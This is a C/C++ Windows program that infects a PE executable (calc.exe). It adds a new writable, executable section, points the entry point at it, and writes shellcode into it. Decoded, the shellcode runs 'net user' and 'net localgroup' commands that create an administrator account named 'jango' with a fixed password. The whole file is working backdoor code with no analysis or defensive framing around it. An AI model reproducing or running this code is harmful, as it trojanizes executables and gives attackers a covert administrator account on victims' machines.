#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
 
DWORD align(DWORD size, DWORD align, DWORD addr) {
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}
 
bool AddSection(char *filepath, char *sectionName, DWORD sizeOfSection) {
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return false;
    DWORD fileSize = GetFileSize(file, NULL);
    //so we know how much buffer to allocate
    BYTE *pByte = new BYTE[fileSize];
    DWORD dw;
    //lets read the entire file,so we can use the PE information
    ReadFile(file, pByte, fileSize, &dw, NULL);
 
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false; //invalid PE
    PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER));
    PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
 
    ZeroMemory(&SH[FH->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&SH[FH->NumberOfSections].Name, sectionName, 8); 
    //We use 8 bytes for section name,cause it is the maximum allowed section name size
 
    //lets insert all the required information about our new PE section
    SH[FH->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, OH->SectionAlignment, 0);
    SH[FH->NumberOfSections].VirtualAddress = align(SH[FH->NumberOfSections - 1].Misc.VirtualSize, OH->SectionAlignment, SH[FH->NumberOfSections - 1].VirtualAddress);
    SH[FH->NumberOfSections].SizeOfRawData = align(sizeOfSection, OH->FileAlignment, 0);
    SH[FH->NumberOfSections].PointerToRawData = align(SH[FH->NumberOfSections - 1].SizeOfRawData, OH->FileAlignment, SH[FH->NumberOfSections - 1].PointerToRawData);
    SH[FH->NumberOfSections].Characteristics = 0xE00000E0;
    /*
        0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                     IMAGE_SCN_CNT_CODE  |
                     IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                     IMAGE_SCN_MEM_EXECUTE |
                     IMAGE_SCN_CNT_INITIALIZED_DATA |
                     IMAGE_SCN_MEM_READ 
    */
    SetFilePointer(file, SH[FH->NumberOfSections].PointerToRawData + SH[FH->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
    //end the file right here,on the last section + it's own size
    SetEndOfFile(file);
    //now lets change the size of the image,to correspond to our modifications
    //by adding a new section,the image size is bigger now
    OH->SizeOfImage = SH[FH->NumberOfSections].VirtualAddress + SH[FH->NumberOfSections].Misc.VirtualSize;
    // set the entry pointer to the new virtual address
    OH->AddressOfEntryPoint = SH[FH->NumberOfSections].VirtualAddress;
    //and we added a new section,so we change the NOS too
    FH->NumberOfSections += 1;
    SetFilePointer(file, 0, NULL, FILE_BEGIN);
    //and finaly,we add all the modifications to the file
    WriteFile(file, pByte, fileSize, &dw, NULL);
    CloseHandle(file);
    return true;
}
 
bool AddCode(char *filepath) {
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return false;
    DWORD filesize = GetFileSize(file, NULL);
    BYTE *pByte = new BYTE[filesize];
    DWORD dw;
    ReadFile(file, pByte, filesize, &dw, NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
 
    //since we added a new section,it must be the last section added,cause of the code inside
    //AddSection function,thus we must get to the last section to insert our secret data :)
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
    PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);
 
    SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
    // example shellcode: add new user jango Jango01$
    unsigned char buf[] =
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x6a\x61\x6e\x67\x6f\x20\x4a\x61\x6e\x67\x6f\x30\x31\x24\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x6a\x61\x6e\x67\x6f\x20\x2f\x41\x44\x44\x00";
    WriteFile(file, buf, sizeof(buf), &dw, 0);
    CloseHandle(file);
    return TRUE;
}
 
int main() {
    if (AddSection("C:\\Users\\manuel\\Desktop\\calc.exe", ".ATH", 400)){
        printf("Section added!\n");
        //Lets insert data into the last section
        if (AddCode("C:\\Users\\manuel\\Desktop\\calc.exe")) printf("Code written!\n");
        else printf("Error writting code!\n");
    }
    else  printf("Error adding section!\n");
}